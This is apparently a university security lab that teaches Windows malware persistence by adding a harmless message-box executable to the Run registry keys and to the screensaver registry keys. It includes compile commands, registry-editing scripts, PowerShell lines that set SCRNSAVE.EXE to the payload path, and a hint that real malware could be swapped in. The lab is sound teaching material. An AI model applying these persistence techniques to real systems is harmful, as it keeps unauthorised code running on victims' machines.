# Lab 2: Malware

{% hint style="danger" %}
READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.
{% endhint %}

In this lab, we will create and use dummy malware samples on a Windows machine (we just call it malware but it is quite harmless, unless you make it so). To do this lab, we will require two VMs (don't have to be running at the same time) - Kali and Windows.

## 2.0. Setup Windows 10 VM

You can select and download Windows 10 ISO from their official website:

```
https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
```

{% hint style="info" %}
The default login and password are `IEUser`/`Passw0rd!`
{% endhint %}

or if you have Apple Silicon go here and select Windows (also follow the instructions there):

```
https://mac.getutm.app/gallery/
```

{% hint style="warning" %}
Please be advised that the size of the ISO is \~6GB!&#x20;
{% endhint %}

{% hint style="info" %}
Once downloaded, you can install it on your VMM. We just need the Windows running (no specific software or settings required) so you can do the minimal setup where feasible. The VM comes with 90 days trial license, but you can take a snapshot after setting up, so you can _refresh_ the expiry date.&#x20;
{% endhint %}

## 2.1. Persistent Malware in Registry

In this lab, we will have a look at how to make the malware persistent on the Windows machine. One of the simplest ways of achieving this is to modify the registry keys. Registry keys, specifically the "Run keys", can be configured and are executed when the user logs in.

The following run keys are created by Windows:

* `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`

{% hint style="info" %}
In the command, replace `HKEY_CURRENT_USER` with `HKCU` and `HKEY_LOCAL_MACHINE` with `HKLM`
{% endhint %}

![](<../.gitbook/assets/image (4) (1).png>)

The listed keys may be different but that is not an issue, what we are interested in is how those keys change when we modify them later. Because those keys are running every time the user logs in, we can attach malware to the run keys then it will become (virtually) permanent!

Now, let's use a simple malware(?) code, which you can get from here:

```
wget https://raw.githubusercontent.com/uwacyber/cits3006/2022s2/cits3006-labs/files/windows_malware.cpp
```

The code actually doesn't do much other than display a message box. If it is placed into the run keys, then you will be greeted with the message every time you log in. Since the code needs to run on a Windows machine, you have to compile it for the target machine environment:

```
sudo apt-get install g++-mingw-w64-x86-64 -y
```

```
x86_64-w64-mingw32-g++ -O2 windows_malware.cpp -o bad.exe -mwindows -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

![](<../.gitbook/assets/image (9) (1) (1).png>)

Now move the executable `bad.exe` to your target Windows 10 VM. You can also download a copy here from your Windows 10 VM:

```
wget https://raw.githubusercontent.com/uwacyber/cits3006/2022s2/cits3006-labs/files/bad.exe
```

Create a folder `test` inside the C drive i.e., `C:/test/bad.exe` (you can technically save it anywhere, but other scripts will use a hard-coded path so if you don't want to modify the path etc., use this instead). You can also execute it for testing - it should pop up in a message box.

![](<../.gitbook/assets/image (10).png>)

The `bad.exe` only shows the message box, so we have to create a program that will insert this executable file into the registry keys. This is achieved using the `registry_script.cpp`.

```
wget https://raw.githubusercontent.com/uwacyber/cits3006/2022s2/cits3006-labs/files/registry_script.cpp
```

{% hint style="info" %}
Inspect the `registry_script.cpp` and see how easy it is to modify the registry key!
{% endhint %}

Now compile the script:

```
x86_64-w64-mingw32-g++ -O2 registry_script.cpp -o bad_script.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

![](<../.gitbook/assets/image (5) (2).png>)

Before you run the `bad_script.exe`, let's first check the current status of the registry key (should be the same as when you first ran above).

```
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
```

![](<../.gitbook/assets/image (7) (1).png>)

You can see a row has been added when the `bad_script.exe` ran, which is pointing at the location of the malware we saved.

A good thing is that you are notified of this action when a new registry was added:

![](<../.gitbook/assets/image (2) (1).png>)

Nevertheless, now we can test that our persistent malware(?) is working correctly. Log out and log in again to see:

![](<../.gitbook/assets/image (4) (2).png>)

![](<../.gitbook/assets/image (8) (2).png>)

![](<../.gitbook/assets/image (6) (1).png>)

Uh oh, the message box popped up (as expected)!

Now imagine you wrote an actual malware (whether by hand or using tools such as `msfvenom` \*cough cough\*) and did this!

{% hint style="danger" %}
Actually, if you do this to anyone else but yourself, you will go to jail, so please don't.
{% endhint %}

Finally, let's clean up the registry (so you don't have to see the message every time you log in):

```
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "hack"
```

and check that it is indeed gone:

```
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
```

![](<../.gitbook/assets/image (9) (1).png>)

## 2.2. Persistent Malware in Screensaver

This is also related to the registry keys, but modifying the existing registry key (in particular, the screensaver) instead of the running keys used at the startup.

There are other registry keys that could be modified, but the screensaver one is chosen so that we can see a timed malware execution instead of upon logging in.

Screensavers are PE files with a `.scr` extension by default and settings are stored in the following registry keys:

```
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive
```

You can check that ScreenSaveActive is on by:

```
reg query "HKCU\Control Panel\Desktop" /s
```

and find `ScreenSaveActive` has value 1 (indicating it is enabled).

![](<../.gitbook/assets/image (9) (2).png>)

Two other key registry keys important here are:

* `HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut` - sets user inactivity timeout before screensaver is executed.
* `HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE` - set the app path to run.

For this exercise, we will use the same malware from the previous section (i.e., `bad.exe` we created). So nothing to do for this one. But we do need a different script to modify the screensaver-related registry keys, which you can find here:

```
wget https://raw.githubusercontent.com/uwacyber/cits3006/2022s2/cits3006-labs/files/screensaver_script.cpp
```

{% hint style="info" %}
As before, inspect the `screensaver_script.cpp` and see how the registry keys are changed.
{% endhint %}

Now compile the script:

```
x86_64-w64-mingw32-g++ -O2 scensaver_script.cpp -o bad_script2.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

{% hint style="info" %}
If you have access to the PowerShell (also possible on cmd) using a reverse shell (or similar), you can directly modify the registry without compiling the code above:

```
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveTimeOut' -Value '10'
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Value 'C:\test\bad.exe'
```
{% endhint %}

![](<../.gitbook/assets/image (3) (2).png>)

Check if the registry keys are enabled (it should not be on a fresh Windows install, but just in case), and disable them if they are:

```
reg query "HKCU\Control Panel\Desktop" /s
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'ScreenSaveTimeOut'
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'SCRNSAVE.EXE'
```

{% hint style="info" %}
They may not exist (not enabled), then you will just see error messages.
{% endhint %}

Now run our malicious script on our target Windows 10 VM and check the registry keys again:

```
wget https://raw.githubusercontent.com/uwacyber/cits3006/2022s2/cits3006-labs/files/bad_script2.exe
```

![](<../.gitbook/assets/image (2) (2).png>)

So we have successfully added the registry keys using our script!

To test, just log out and log in again, then wait 10 seconds (or slightly more, if the VM is slow).

![](<../.gitbook/assets/image (7).png>)

Voila! as the screensaver runs (background went dark), our malware also gets executed! At this point, you can get out of the screensaver and wait another 10 seconds to see it repeat. Every time the screensaver runs, the malware gets executed.

Once done experimenting, don't forget to tidy up your registry keys:

```
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'ScreenSaveTimeOut'
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'SCRNSAVE.EXE'
reg query "HKCU\Control Panel\Desktop" /s
```

{% hint style="info" %}
The malicious scripts must run to modify the registry keys so once we manually remove them, they don't get modified unless we run the scripts again.
{% endhint %}

## 2.3 Summary

In this lab, we covered how to create persistent malware, through running keys and the screensaver application - both through modifying the registry keys. Of course, these are specific to Windows OS, but the concept applies the same with other OSes (Linux, Mac etc.), where almost all OSes have startup scripts (e.g., crontab on Linux) and screensavers.&#x20;

Next up, Reverse Engineering.

Credit: materials adopted from @cocomelonc with some fixes/adjustments.
